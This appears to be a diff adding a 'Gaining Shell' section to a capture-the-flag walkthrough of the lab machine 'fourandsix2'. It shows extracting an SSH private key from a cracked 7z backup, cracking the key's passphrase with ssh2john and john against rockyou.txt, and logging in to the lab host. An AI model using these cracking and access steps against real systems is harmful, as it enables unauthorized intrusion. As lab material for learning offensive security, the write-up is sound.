@@ -99,10 +99,69 @@ chocolate        (backup.7z)
 1g 0:00:00:01 DONE (2023-11-05 06:31) 0.9708g/s 31.06p/s 31.06c/s 31.06C/s 654321..butterfly
 Use the "--show" option to display all of the cracked passwords reliably
 ```
+## 3.Gaining Shell
 
+Having the password we try to unzip the file :
 
+```bash
+root@kali: 7za e backup.7z
+```
 
+two of the files are interesting :
+- id_rsa
+- id_rsa.pub
 
+from id_rsa.pub we can see the what user is associated with this public key :
+
+```bash
+root@kali: cat id_rsa.pub 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDClNemaX//nOugJPAWyQ1aDMgfAS8zrJh++hNeMGCo+TIm9UxVUNwc6vhZ8apKZHOX0Ht+MlHLYdkbwSinmCRmOkm2JbMYA5GNBG3fTNWOAbhd7dl2GPG7NUD+zhaDFyRk5gTqmuFumECDAgCxzeE8r9jBwfX73cETemexWKnGqLey0T56VypNrjvueFPmmrWCJyPcXtoLNQDbbdaWwJPhF0gKGrrWTEZo0NnU1lMAnKkiooDxLFhxOIOxRIXWtDtc61cpnnJHtKeO+9wL2q7JeUQB00KLs9/iRwV6b+kslvHaaQ4TR8IaufuJqmICuE4+v7HdsQHslmIbPKX6HANn user@fourandsix2
+```
+
+so the user `user` is bing to this key, we now just need to connect to server with the private key and user `user` :
+
+```bash
+root@kali: ssh -i id_rsa user@192.168.56.110
+Enter passphrase for key 'id_rsa': 
+```
+
+but it needs the passphrase, we can use `ssh2john` for this one :
+
+```bash
+root@kali: ssh2john id_rsa > hash.txt
+
+root@kali:  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+12345678         (id_rsa)     
+1g 0:00:00:01 DONE (2023-11-05 06:39) 0.8620g/s 13.79p/s 13.79c/s 13.79C/s 123456..jessica
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+now we can easily connect to server :
+
+```bash
+root@kali: ssh -i id_rsa user@192.168.56.110
+Enter passphrase for key 'id_rsa': 
+Last login: Sun Nov  5 12:11:12 2023 from 192.168.56.102
+OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018
+
+Welcome to OpenBSD: The proactively secure Unix-like operating system.
+
+Please use the sendbug(1) utility to report bugs in the system.
+Before reporting a bug, please try to reproduce it with the latest
+version of the code.  With bug reports, please try to ensure that
+enough information to reproduce the problem is enclosed, and if a
+known fix for it exists, include that as well.
+
+fourandsix2$ id
+uid=1000(user) gid=1000(user) groups=1000(user), 0(wheel)
+```
 
 
 
